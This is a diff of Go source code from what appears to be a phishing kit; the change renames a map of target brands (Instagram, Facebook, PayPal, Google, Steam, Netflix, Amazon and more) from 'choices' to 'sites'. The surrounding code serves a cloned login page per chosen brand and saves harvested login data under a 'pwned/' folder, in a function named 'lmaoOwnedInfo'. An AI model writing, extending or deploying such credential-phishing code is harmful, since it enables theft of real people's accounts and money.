@@ -33,7 +33,7 @@ import (
 	menu()
 }*/
 
-var choices map[int]string
+var sites map[int]string
 var siteSelection int
 
 // Login stores the user's login data
@@ -111,7 +111,7 @@ func (p *Login) lmaoOwnedInfo(choice int) error {
 		log.Fatal(err)
 	}
 
-	path := "pwned/" + choices[choice]
+	path := "pwned/" + sites[choice]
 
 	if _, err := os.Stat(path); os.IsNotExist(err) {
 		os.Mkdir(path, 0755)
@@ -126,7 +126,7 @@ func (p *Login) lmaoOwnedInfo(choice int) error {
 
 func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
 	p := &Login{}
-	t, _ := template.ParseFiles("templates/" + choices[siteSelection] + "/login.html")
+	t, _ := template.ParseFiles("templates/" + sites[siteSelection] + "/login.html")
 	t.Execute(w, p)
 }
 
@@ -161,37 +161,37 @@ func displayMenu(warning bool, name string, website string) {
 		fmt.Println(v)
 	}
 
-	ints := make([]int, 0, len(choices))
-	for i := range choices {
+	ints := make([]int, 0, len(sites))
+	for i := range sites {
 		ints = append(ints, i)
 	}
 	sort.Ints(ints)
 
 	for _, v := range ints {
-		fmt.Printf("[%d] %s\n", v, choices[v])
+		fmt.Printf("[%d] %s\n", v, sites[v])
 	}
 
 }
 
 func initChoices() {
-	choices = make(map[int]string)
-	choices[1] = "Instagram"
-	choices[2] = "Facebook"
-	choices[3] = "Twitter"
-	choices[4] = "Google"
-	choices[5] = "PayPal"
-	choices[6] = "Steam"
-	choices[7] = "Linkedin"
-	choices[8] = "eBay"
-	choices[9] = "CryptoCurrency"
-	choices[10] = "Adobe ID"
-	choices[11] = "Messenger"
-	choices[12] = "Twitch"
-	choices[13] = "Badoo"
-	choices[14] = "devianART"
-	choices[15] = "Snapchat"
-	choices[16] = "Netflix"
-	choices[17] = "Amazon"
+	sites = make(map[int]string)
+	sites[1] = "Instagram"
+	sites[2] = "Facebook"
+	sites[3] = "Twitter"
+	sites[4] = "Google"
+	sites[5] = "PayPal"
+	sites[6] = "Steam"
+	sites[7] = "Linkedin"
+	sites[8] = "eBay"
+	sites[9] = "CryptoCurrency"
+	sites[10] = "Adobe ID"
+	sites[11] = "Messenger"
+	sites[12] = "Twitch"
+	sites[13] = "Badoo"
+	sites[14] = "devianART"
+	sites[15] = "Snapchat"
+	sites[16] = "Netflix"
+	sites[17] = "Amazon"
 }
 
 func userPrompt(prompt string) (string, error) {
